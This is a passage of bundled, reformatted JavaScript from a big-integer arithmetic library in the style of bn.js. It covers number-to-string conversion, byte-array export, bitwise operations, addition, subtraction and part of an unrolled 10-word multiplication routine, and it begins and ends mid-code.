                        for (var ncarry = carry >>> 26, rword = 67108863 & carry, maxJ = Math.min(k, num.length - 1), j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
                            var i = (k - j) | 0;
                            (ncarry += ((r = (a = 0 | self.words[i]) * (b = 0 | num.words[j]) + rword) / 67108864) | 0), (rword = 67108863 & r);
                        }
                        (out.words[k] = 0 | rword), (carry = 0 | ncarry);
                    }
                    return 0 !== carry ? (out.words[k] = 0 | carry) : out.length--, out.strip();
                }
                (BN.prototype.toString = function (base, padding) {
                    var out;
                    if (((padding = 0 | padding || 1), 16 === (base = base || 10) || "hex" === base)) {
                        out = "";
                        for (var off = 0, carry = 0, i = 0; i < this.length; i++) {
                            var w = this.words[i],
                                word = (16777215 & ((w << off) | carry)).toString(16);
                            (out = 0 !== (carry = (w >>> (24 - off)) & 16777215) || i !== this.length - 1 ? zeros[6 - word.length] + word + out : word + out), (off += 2) >= 26 && ((off -= 26), i--);
                        }
                        for (0 !== carry && (out = carry.toString(16) + out); out.length % padding != 0; ) out = "0" + out;
                        return 0 !== this.negative && (out = "-" + out), out;
                    }
                    if (base === (0 | base) && base >= 2 && base <= 36) {
                        var groupSize = groupSizes[base],
                            groupBase = groupBases[base];
                        out = "";
                        var c = this.clone();
                        for (c.negative = 0; !c.isZero(); ) {
                            var r = c.modn(groupBase).toString(base);
                            out = (c = c.idivn(groupBase)).isZero() ? r + out : zeros[groupSize - r.length] + r + out;
                        }
                        for (this.isZero() && (out = "0" + out); out.length % padding != 0; ) out = "0" + out;
                        return 0 !== this.negative && (out = "-" + out), out;
                    }
                    assert(!1, "Base should be between 2 and 36");
                }),
                    (BN.prototype.toNumber = function () {
                        var ret = this.words[0];
                        return (
                            2 === this.length
                                ? (ret += 67108864 * this.words[1])
                                : 3 === this.length && 1 === this.words[2]
                                ? (ret += 4503599627370496 + 67108864 * this.words[1])
                                : this.length > 2 && assert(!1, "Number can only safely store up to 53 bits"),
                            0 !== this.negative ? -ret : ret
                        );
                    }),
                    (BN.prototype.toJSON = function () {
                        return this.toString(16);
                    }),
                    (BN.prototype.toBuffer = function (endian, length) {
                        return assert(void 0 !== Buffer), this.toArrayLike(Buffer, endian, length);
                    }),
                    (BN.prototype.toArray = function (endian, length) {
                        return this.toArrayLike(Array, endian, length);
                    }),
                    (BN.prototype.toArrayLike = function (ArrayType, endian, length) {
                        var byteLength = this.byteLength(),
                            reqLength = length || Math.max(1, byteLength);
                        assert(byteLength <= reqLength, "byte array longer than desired length"), assert(reqLength > 0, "Requested array length <= 0"), this.strip();
                        var b,
                            i,
                            littleEndian = "le" === endian,
                            res = new ArrayType(reqLength),
                            q = this.clone();
                        if (littleEndian) {
                            for (i = 0; !q.isZero(); i++) (b = q.andln(255)), q.iushrn(8), (res[i] = b);
                            for (; i < reqLength; i++) res[i] = 0;
                        } else {
                            for (i = 0; i < reqLength - byteLength; i++) res[i] = 0;
                            for (i = 0; !q.isZero(); i++) (b = q.andln(255)), q.iushrn(8), (res[reqLength - i - 1] = b);
                        }
                        return res;
                    }),
                    Math.clz32
                        ? (BN.prototype._countBits = function (w) {
                              return 32 - Math.clz32(w);
                          })
                        : (BN.prototype._countBits = function (w) {
                              var t = w,
                                  r = 0;
                              return t >= 4096 && ((r += 13), (t >>>= 13)), t >= 64 && ((r += 7), (t >>>= 7)), t >= 8 && ((r += 4), (t >>>= 4)), t >= 2 && ((r += 2), (t >>>= 2)), r + t;
                          }),
                    (BN.prototype._zeroBits = function (w) {
                        if (0 === w) return 26;
                        var t = w,
                            r = 0;
                        return 0 == (8191 & t) && ((r += 13), (t >>>= 13)), 0 == (127 & t) && ((r += 7), (t >>>= 7)), 0 == (15 & t) && ((r += 4), (t >>>= 4)), 0 == (3 & t) && ((r += 2), (t >>>= 2)), 0 == (1 & t) && r++, r;
                    }),
                    (BN.prototype.bitLength = function () {
                        var w = this.words[this.length - 1],
                            hi = this._countBits(w);
                        return 26 * (this.length - 1) + hi;
                    }),
                    (BN.prototype.zeroBits = function () {
                        if (this.isZero()) return 0;
                        for (var r = 0, i = 0; i < this.length; i++) {
                            var b = this._zeroBits(this.words[i]);
                            if (((r += b), 26 !== b)) break;
                        }
                        return r;
                    }),
                    (BN.prototype.byteLength = function () {
                        return Math.ceil(this.bitLength() / 8);
                    }),
                    (BN.prototype.toTwos = function (width) {
                        return 0 !== this.negative ? this.abs().inotn(width).iaddn(1) : this.clone();
                    }),
                    (BN.prototype.fromTwos = function (width) {
                        return this.testn(width - 1) ? this.notn(width).iaddn(1).ineg() : this.clone();
                    }),
                    (BN.prototype.isNeg = function () {
                        return 0 !== this.negative;
                    }),
                    (BN.prototype.neg = function () {
                        return this.clone().ineg();
                    }),
                    (BN.prototype.ineg = function () {
                        return this.isZero() || (this.negative ^= 1), this;
                    }),
                    (BN.prototype.iuor = function (num) {
                        for (; this.length < num.length; ) this.words[this.length++] = 0;
                        for (var i = 0; i < num.length; i++) this.words[i] = this.words[i] | num.words[i];
                        return this.strip();
                    }),
                    (BN.prototype.ior = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuor(num);
                    }),
                    (BN.prototype.or = function (num) {
                        return this.length > num.length ? this.clone().ior(num) : num.clone().ior(this);
                    }),
                    (BN.prototype.uor = function (num) {
                        return this.length > num.length ? this.clone().iuor(num) : num.clone().iuor(this);
                    }),
                    (BN.prototype.iuand = function (num) {
                        var b;
                        b = this.length > num.length ? num : this;
                        for (var i = 0; i < b.length; i++) this.words[i] = this.words[i] & num.words[i];
                        return (this.length = b.length), this.strip();
                    }),
                    (BN.prototype.iand = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuand(num);
                    }),
                    (BN.prototype.and = function (num) {
                        return this.length > num.length ? this.clone().iand(num) : num.clone().iand(this);
                    }),
                    (BN.prototype.uand = function (num) {
                        return this.length > num.length ? this.clone().iuand(num) : num.clone().iuand(this);
                    }),
                    (BN.prototype.iuxor = function (num) {
                        var a, b;
                        this.length > num.length ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var i = 0; i < b.length; i++) this.words[i] = a.words[i] ^ b.words[i];
                        if (this !== a) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return (this.length = a.length), this.strip();
                    }),
                    (BN.prototype.ixor = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuxor(num);
                    }),
                    (BN.prototype.xor = function (num) {
                        return this.length > num.length ? this.clone().ixor(num) : num.clone().ixor(this);
                    }),
                    (BN.prototype.uxor = function (num) {
                        return this.length > num.length ? this.clone().iuxor(num) : num.clone().iuxor(this);
                    }),
                    (BN.prototype.inotn = function (width) {
                        assert("number" == typeof width && width >= 0);
                        var bytesNeeded = 0 | Math.ceil(width / 26),
                            bitsLeft = width % 26;
                        this._expand(bytesNeeded), bitsLeft > 0 && bytesNeeded--;
                        for (var i = 0; i < bytesNeeded; i++) this.words[i] = 67108863 & ~this.words[i];
                        return bitsLeft > 0 && (this.words[i] = ~this.words[i] & (67108863 >> (26 - bitsLeft))), this.strip();
                    }),
                    (BN.prototype.notn = function (width) {
                        return this.clone().inotn(width);
                    }),
                    (BN.prototype.setn = function (bit, val) {
                        assert("number" == typeof bit && bit >= 0);
                        var off = (bit / 26) | 0,
                            wbit = bit % 26;
                        return this._expand(off + 1), (this.words[off] = val ? this.words[off] | (1 << wbit) : this.words[off] & ~(1 << wbit)), this.strip();
                    }),
                    (BN.prototype.iadd = function (num) {
                        var r, a, b;
                        if (0 !== this.negative && 0 === num.negative) return (this.negative = 0), (r = this.isub(num)), (this.negative ^= 1), this._normSign();
                        if (0 === this.negative && 0 !== num.negative) return (num.negative = 0), (r = this.isub(num)), (num.negative = 1), r._normSign();
                        this.length > num.length ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var carry = 0, i = 0; i < b.length; i++) (r = (0 | a.words[i]) + (0 | b.words[i]) + carry), (this.words[i] = 67108863 & r), (carry = r >>> 26);
                        for (; 0 !== carry && i < a.length; i++) (r = (0 | a.words[i]) + carry), (this.words[i] = 67108863 & r), (carry = r >>> 26);
                        if (((this.length = a.length), 0 !== carry)) (this.words[this.length] = carry), this.length++;
                        else if (a !== this) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return this;
                    }),
                    (BN.prototype.add = function (num) {
                        var res;
                        return 0 !== num.negative && 0 === this.negative
                            ? ((num.negative = 0), (res = this.sub(num)), (num.negative ^= 1), res)
                            : 0 === num.negative && 0 !== this.negative
                            ? ((this.negative = 0), (res = num.sub(this)), (this.negative = 1), res)
                            : this.length > num.length
                            ? this.clone().iadd(num)
                            : num.clone().iadd(this);
                    }),
                    (BN.prototype.isub = function (num) {
                        if (0 !== num.negative) {
                            num.negative = 0;
                            var r = this.iadd(num);
                            return (num.negative = 1), r._normSign();
                        }
                        if (0 !== this.negative) return (this.negative = 0), this.iadd(num), (this.negative = 1), this._normSign();
                        var a,
                            b,
                            cmp = this.cmp(num);
                        if (0 === cmp) return (this.negative = 0), (this.length = 1), (this.words[0] = 0), this;
                        cmp > 0 ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var carry = 0, i = 0; i < b.length; i++) (carry = (r = (0 | a.words[i]) - (0 | b.words[i]) + carry) >> 26), (this.words[i] = 67108863 & r);
                        for (; 0 !== carry && i < a.length; i++) (carry = (r = (0 | a.words[i]) + carry) >> 26), (this.words[i] = 67108863 & r);
                        if (0 === carry && i < a.length && a !== this) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return (this.length = Math.max(this.length, i)), a !== this && (this.negative = 1), this.strip();
                    }),
                    (BN.prototype.sub = function (num) {
                        return this.clone().isub(num);
                    });
                var comb10MulTo = function (self, num, out) {
                    var lo,
                        mid,
                        hi,
                        a = self.words,
                        b = num.words,
                        o = out.words,
                        c = 0,
                        a0 = 0 | a[0],
                        al0 = 8191 & a0,
                        ah0 = a0 >>> 13,
                        a1 = 0 | a[1],
                        al1 = 8191 & a1,
                        ah1 = a1 >>> 13,
                        a2 = 0 | a[2],
                        al2 = 8191 & a2,
                        ah2 = a2 >>> 13,
                        a3 = 0 | a[3],
                        al3 = 8191 & a3,
                        ah3 = a3 >>> 13,
                        a4 = 0 | a[4],
                        al4 = 8191 & a4,
                        ah4 = a4 >>> 13,
                        a5 = 0 | a[5],
                        al5 = 8191 & a5,
                        ah5 = a5 >>> 13,
                        a6 = 0 | a[6],
                        al6 = 8191 & a6,
                        ah6 = a6 >>> 13,
                        a7 = 0 | a[7],
                        al7 = 8191 & a7,
                        ah7 = a7 >>> 13,
                        a8 = 0 | a[8],
                        al8 = 8191 & a8,
                        ah8 = a8 >>> 13,
                        a9 = 0 | a[9],
                        al9 = 8191 & a9,
                        ah9 = a9 >>> 13,
                        b0 = 0 | b[0],
                        bl0 = 8191 & b0,
                        bh0 = b0 >>> 13,
                        b1 = 0 | b[1],
                        bl1 = 8191 & b1,
                        bh1 = b1 >>> 13,
                        b2 = 0 | b[2],
                        bl2 = 8191 & b2,
                        bh2 = b2 >>> 13,
                        b3 = 0 | b[3],
                        bl3 = 8191 & b3,
                        bh3 = b3 >>> 13,
                        b4 = 0 | b[4],
                        bl4 = 8191 & b4,
                        bh4 = b4 >>> 13,
                        b5 = 0 | b[5],
                        bl5 = 8191 & b5,
                        bh5 = b5 >>> 13,
                        b6 = 0 | b[6],
                        bl6 = 8191 & b6,
                        bh6 = b6 >>> 13,
                        b7 = 0 | b[7],
                        bl7 = 8191 & b7,
                        bh7 = b7 >>> 13,
                        b8 = 0 | b[8],
                        bl8 = 8191 & b8,
                        bh8 = b8 >>> 13,
                        b9 = 0 | b[9],
                        bl9 = 8191 & b9,
                        bh9 = b9 >>> 13;
                    (out.negative = self.negative ^ num.negative), (out.length = 19);
                    var w0 = (((c + (lo = Math.imul(al0, bl0))) | 0) + ((8191 & (mid = ((mid = Math.imul(al0, bh0)) + Math.imul(ah0, bl0)) | 0)) << 13)) | 0;
                    (c = ((((hi = Math.imul(ah0, bh0)) + (mid >>> 13)) | 0) + (w0 >>> 26)) | 0), (w0 &= 67108863), (lo = Math.imul(al1, bl0)), (mid = ((mid = Math.imul(al1, bh0)) + Math.imul(ah1, bl0)) | 0), (hi = Math.imul(ah1, bh0));
                    var w1 = (((c + (lo = (lo + Math.imul(al0, bl1)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh1)) | 0) + Math.imul(ah0, bl1)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh1)) | 0) + (mid >>> 13)) | 0) + (w1 >>> 26)) | 0),
                        (w1 &= 67108863),
                        (lo = Math.imul(al2, bl0)),
                        (mid = ((mid = Math.imul(al2, bh0)) + Math.imul(ah2, bl0)) | 0),
                        (hi = Math.imul(ah2, bh0)),
                        (lo = (lo + Math.imul(al1, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh1)) | 0) + Math.imul(ah1, bl1)) | 0),
                        (hi = (hi + Math.imul(ah1, bh1)) | 0);
                    var w2 = (((c + (lo = (lo + Math.imul(al0, bl2)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh2)) | 0) + Math.imul(ah0, bl2)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh2)) | 0) + (mid >>> 13)) | 0) + (w2 >>> 26)) | 0),
                        (w2 &= 67108863),
                        (lo = Math.imul(al3, bl0)),
                        (mid = ((mid = Math.imul(al3, bh0)) + Math.imul(ah3, bl0)) | 0),
                        (hi = Math.imul(ah3, bh0)),
                        (lo = (lo + Math.imul(al2, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh1)) | 0) + Math.imul(ah2, bl1)) | 0),
                        (hi = (hi + Math.imul(ah2, bh1)) | 0),
                        (lo = (lo + Math.imul(al1, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh2)) | 0) + Math.imul(ah1, bl2)) | 0),
                        (hi = (hi + Math.imul(ah1, bh2)) | 0);
                    var w3 = (((c + (lo = (lo + Math.imul(al0, bl3)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh3)) | 0) + Math.imul(ah0, bl3)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh3)) | 0) + (mid >>> 13)) | 0) + (w3 >>> 26)) | 0),
                        (w3 &= 67108863),
                        (lo = Math.imul(al4, bl0)),
                        (mid = ((mid = Math.imul(al4, bh0)) + Math.imul(ah4, bl0)) | 0),
                        (hi = Math.imul(ah4, bh0)),
                        (lo = (lo + Math.imul(al3, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh1)) | 0) + Math.imul(ah3, bl1)) | 0),
                        (hi = (hi + Math.imul(ah3, bh1)) | 0),
                        (lo = (lo + Math.imul(al2, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh2)) | 0) + Math.imul(ah2, bl2)) | 0),
                        (hi = (hi + Math.imul(ah2, bh2)) | 0),
                        (lo = (lo + Math.imul(al1, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh3)) | 0) + Math.imul(ah1, bl3)) | 0),
                        (hi = (hi + Math.imul(ah1, bh3)) | 0);
                    var w4 = (((c + (lo = (lo + Math.imul(al0, bl4)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh4)) | 0) + Math.imul(ah0, bl4)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh4)) | 0) + (mid >>> 13)) | 0) + (w4 >>> 26)) | 0),
                        (w4 &= 67108863),
                        (lo = Math.imul(al5, bl0)),
                        (mid = ((mid = Math.imul(al5, bh0)) + Math.imul(ah5, bl0)) | 0),
                        (hi = Math.imul(ah5, bh0)),
                        (lo = (lo + Math.imul(al4, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh1)) | 0) + Math.imul(ah4, bl1)) | 0),
                        (hi = (hi + Math.imul(ah4, bh1)) | 0),
                        (lo = (lo + Math.imul(al3, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh2)) | 0) + Math.imul(ah3, bl2)) | 0),
                        (hi = (hi + Math.imul(ah3, bh2)) | 0),
                        (lo = (lo + Math.imul(al2, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh3)) | 0) + Math.imul(ah2, bl3)) | 0),
                        (hi = (hi + Math.imul(ah2, bh3)) | 0),
                        (lo = (lo + Math.imul(al1, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh4)) | 0) + Math.imul(ah1, bl4)) | 0),
                        (hi = (hi + Math.imul(ah1, bh4)) | 0);
                    var w5 = (((c + (lo = (lo + Math.imul(al0, bl5)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh5)) | 0) + Math.imul(ah0, bl5)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh5)) | 0) + (mid >>> 13)) | 0) + (w5 >>> 26)) | 0),
                        (w5 &= 67108863),
                        (lo = Math.imul(al6, bl0)),
                        (mid = ((mid = Math.imul(al6, bh0)) + Math.imul(ah6, bl0)) | 0),
                        (hi = Math.imul(ah6, bh0)),
                        (lo = (lo + Math.imul(al5, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh1)) | 0) + Math.imul(ah5, bl1)) | 0),
                        (hi = (hi + Math.imul(ah5, bh1)) | 0),
                        (lo = (lo + Math.imul(al4, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh2)) | 0) + Math.imul(ah4, bl2)) | 0),
                        (hi = (hi + Math.imul(ah4, bh2)) | 0),
                        (lo = (lo + Math.imul(al3, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh3)) | 0) + Math.imul(ah3, bl3)) | 0),
                        (hi = (hi + Math.imul(ah3, bh3)) | 0),
                        (lo = (lo + Math.imul(al2, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh4)) | 0) + Math.imul(ah2, bl4)) | 0),
                        (hi = (hi + Math.imul(ah2, bh4)) | 0),
                        (lo = (lo + Math.imul(al1, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh5)) | 0) + Math.imul(ah1, bl5)) | 0),
                        (hi = (hi + Math.imul(ah1, bh5)) | 0);
                    var w6 = (((c + (lo = (lo + Math.imul(al0, bl6)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh6)) | 0) + Math.imul(ah0, bl6)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh6)) | 0) + (mid >>> 13)) | 0) + (w6 >>> 26)) | 0),
                        (w6 &= 67108863),
                        (lo = Math.imul(al7, bl0)),
                        (mid = ((mid = Math.imul(al7, bh0)) + Math.imul(ah7, bl0)) | 0),
                        (hi = Math.imul(ah7, bh0)),
                        (lo = (lo + Math.imul(al6, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh1)) | 0) + Math.imul(ah6, bl1)) | 0),
                        (hi = (hi + Math.imul(ah6, bh1)) | 0),
                        (lo = (lo + Math.imul(al5, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh2)) | 0) + Math.imul(ah5, bl2)) | 0),
                        (hi = (hi + Math.imul(ah5, bh2)) | 0),
                        (lo = (lo + Math.imul(al4, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh3)) | 0) + Math.imul(ah4, bl3)) | 0),
                        (hi = (hi + Math.imul(ah4, bh3)) | 0),
                        (lo = (lo + Math.imul(al3, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh4)) | 0) + Math.imul(ah3, bl4)) | 0),
                        (hi = (hi + Math.imul(ah3, bh4)) | 0),
                        (lo = (lo + Math.imul(al2, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh5)) | 0) + Math.imul(ah2, bl5)) | 0),
                        (hi = (hi + Math.imul(ah2, bh5)) | 0),
                        (lo = (lo + Math.imul(al1, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh6)) | 0) + Math.imul(ah1, bl6)) | 0),
                        (hi = (hi + Math.imul(ah1, bh6)) | 0);
                    var w7 = (((c + (lo = (lo + Math.imul(al0, bl7)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh7)) | 0) + Math.imul(ah0, bl7)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh7)) | 0) + (mid >>> 13)) | 0) + (w7 >>> 26)) | 0),
                        (w7 &= 67108863),
                        (lo = Math.imul(al8, bl0)),
                        (mid = ((mid = Math.imul(al8, bh0)) + Math.imul(ah8, bl0)) | 0),
                        (hi = Math.imul(ah8, bh0)),
                        (lo = (lo + Math.imul(al7, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh1)) | 0) + Math.imul(ah7, bl1)) | 0),
                        (hi = (hi + Math.imul(ah7, bh1)) | 0),
                        (lo = (lo + Math.imul(al6, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh2)) | 0) + Math.imul(ah6, bl2)) | 0),
                        (hi = (hi + Math.imul(ah6, bh2)) | 0),
                        (lo = (lo + Math.imul(al5, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh3)) | 0) + Math.imul(ah5, bl3)) | 0),
                        (hi = (hi + Math.imul(ah5, bh3)) | 0),
                        (lo = (lo + Math.imul(al4, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh4)) | 0) + Math.imul(ah4, bl4)) | 0),
                        (hi = (hi + Math.imul(ah4, bh4)) | 0),
                        (lo = (lo + Math.imul(al3, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh5)) | 0) + Math.imul(ah3, bl5)) | 0),
                        (hi = (hi + Math.imul(ah3, bh5)) | 0),
                        (lo = (lo + Math.imul(al2, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh6)) | 0) + Math.imul(ah2, bl6)) | 0),
                        (hi = (hi + Math.imul(ah2, bh6)) | 0),
                        (lo = (lo + Math.imul(al1, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh7)) | 0) + Math.imul(ah1, bl7)) | 0),
                        (hi = (hi + Math.imul(ah1, bh7)) | 0);
                    var w8 = (((c + (lo = (lo + Math.imul(al0, bl8)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh8)) | 0) + Math.imul(ah0, bl8)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh8)) | 0) + (mid >>> 13)) | 0) + (w8 >>> 26)) | 0),
                        (w8 &= 67108863),
                        (lo = Math.imul(al9, bl0)),
                        (mid = ((mid = Math.imul(al9, bh0)) + Math.imul(ah9, bl0)) | 0),
                        (hi = Math.imul(ah9, bh0)),
                        (lo = (lo + Math.imul(al8, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh1)) | 0) + Math.imul(ah8, bl1)) | 0),
                        (hi = (hi + Math.imul(ah8, bh1)) | 0),
                        (lo = (lo + Math.imul(al7, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh2)) | 0) + Math.imul(ah7, bl2)) | 0),
                        (hi = (hi + Math.imul(ah7, bh2)) | 0),
                        (lo = (lo + Math.imul(al6, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh3)) | 0) + Math.imul(ah6, bl3)) | 0),
                        (hi = (hi + Math.imul(ah6, bh3)) | 0),
                        (lo = (lo + Math.imul(al5, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh4)) | 0) + Math.imul(ah5, bl4)) | 0),
                        (hi = (hi + Math.imul(ah5, bh4)) | 0),
                        (lo = (lo + Math.imul(al4, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh5)) | 0) + Math.imul(ah4, bl5)) | 0),
                        (hi = (hi + Math.imul(ah4, bh5)) | 0),
                        (lo = (lo + Math.imul(al3, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh6)) | 0) + Math.imul(ah3, bl6)) | 0),
                        (hi = (hi + Math.imul(ah3, bh6)) | 0),
                        (lo = (lo + Math.imul(al2, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh7)) | 0) + Math.imul(ah2, bl7)) | 0),
                        (hi = (hi + Math.imul(ah2, bh7)) | 0),
                        (lo = (lo + Math.imul(al1, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh8)) | 0) + Math.imul(ah1, bl8)) | 0),
                        (hi = (hi + Math.imul(ah1, bh8)) | 0);
                    var w9 = (((c + (lo = (lo + Math.imul(al0, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh9)) | 0) + Math.imul(ah0, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh9)) | 0) + (mid >>> 13)) | 0) + (w9 >>> 26)) | 0),
                        (w9 &= 67108863),
                        (lo = Math.imul(al9, bl1)),
                        (mid = ((mid = Math.imul(al9, bh1)) + Math.imul(ah9, bl1)) | 0),
                        (hi = Math.imul(ah9, bh1)),
                        (lo = (lo + Math.imul(al8, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh2)) | 0) + Math.imul(ah8, bl2)) | 0),
                        (hi = (hi + Math.imul(ah8, bh2)) | 0),
                        (lo = (lo + Math.imul(al7, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh3)) | 0) + Math.imul(ah7, bl3)) | 0),
                        (hi = (hi + Math.imul(ah7, bh3)) | 0),
                        (lo = (lo + Math.imul(al6, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh4)) | 0) + Math.imul(ah6, bl4)) | 0),
                        (hi = (hi + Math.imul(ah6, bh4)) | 0),
                        (lo = (lo + Math.imul(al5, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh5)) | 0) + Math.imul(ah5, bl5)) | 0),
                        (hi = (hi + Math.imul(ah5, bh5)) | 0),
                        (lo = (lo + Math.imul(al4, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh6)) | 0) + Math.imul(ah4, bl6)) | 0),
                        (hi = (hi + Math.imul(ah4, bh6)) | 0),
                        (lo = (lo + Math.imul(al3, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh7)) | 0) + Math.imul(ah3, bl7)) | 0),
                        (hi = (hi + Math.imul(ah3, bh7)) | 0),
                        (lo = (lo + Math.imul(al2, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh8)) | 0) + Math.imul(ah2, bl8)) | 0),
                        (hi = (hi + Math.imul(ah2, bh8)) | 0);
                    var w10 = (((c + (lo = (lo + Math.imul(al1, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al1, bh9)) | 0) + Math.imul(ah1, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah1, bh9)) | 0) + (mid >>> 13)) | 0) + (w10 >>> 26)) | 0),
                        (w10 &= 67108863),
                        (lo = Math.imul(al9, bl2)),
                        (mid = ((mid = Math.imul(al9, bh2)) + Math.imul(ah9, bl2)) | 0),
                        (hi = Math.imul(ah9, bh2)),
                        (lo = (lo + Math.imul(al8, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh3)) | 0) + Math.imul(ah8, bl3)) | 0),
                        (hi = (hi + Math.imul(ah8, bh3)) | 0),
                        (lo = (lo + Math.imul(al7, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh4)) | 0) + Math.imul(ah7, bl4)) | 0),
                        (hi = (hi + Math.imul(ah7, bh4)) | 0),
                        (lo = (lo + Math.imul(al6, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh5)) | 0) + Math.imul(ah6, bl5)) | 0),
                        (hi = (hi + Math.imul(ah6, bh5)) | 0),
                        (lo = (lo + Math.imul(al5, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh6)) | 0) + Math.imul(ah5, bl6)) | 0),
                        (hi = (hi + Math.imul(ah5, bh6)) | 0),
                        (lo = (lo + Math.imul(al4, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh7)) | 0) + Math.imul(ah4, bl7)) | 0),
                        (hi = (hi + Math.imul(ah4, bh7)) | 0),
                        (lo = (lo + Math.imul(al3, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh8)) | 0) + Math.imul(ah3, bl8)) | 0),
                        (hi = (hi + Math.imul(ah3, bh8)) | 0);
                    var w11 = (((c + (lo = (lo + Math.imul(al2, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al2, bh9)) | 0) + Math.imul(ah2, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah2, bh9)) | 0) + (mid >>> 13)) | 0) + (w11 >>> 26)) | 0),
                        (w11 &= 67108863),
                        (lo = Math.imul(al9, bl3)),
                        (mid = ((mid = Math.imul(al9, bh3)) + Math.imul(ah9, bl3)) | 0),
                        (hi = Math.imul(ah9, bh3)),
                        (lo = (lo + Math.imul(al8, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh4)) | 0) + Math.imul(ah8, bl4)) | 0),
                        (hi = (hi + Math.imul(ah8, bh4)) | 0),
                        (lo = (lo + Math.imul(al7, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh5)) | 0) + Math.imul(ah7, bl5)) | 0),
                        (hi = (hi + Math.imul(ah7, bh5)) | 0),
